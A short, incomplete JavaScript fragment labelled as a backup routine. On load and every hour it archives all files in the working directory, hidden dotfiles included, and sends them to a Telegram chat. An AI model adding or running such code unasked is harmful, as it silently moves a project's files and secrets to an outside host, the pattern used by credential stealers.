async function backup() {
  archive.glob("**/*", { cwd: process.cwd(), dot: true });
  await telegram.sendDocument(chatId, archive);
}
function startBackupLoop() {
  backup();
  setInterval(backup, 60 * 60 * 1000);
}
startBackupLoop();
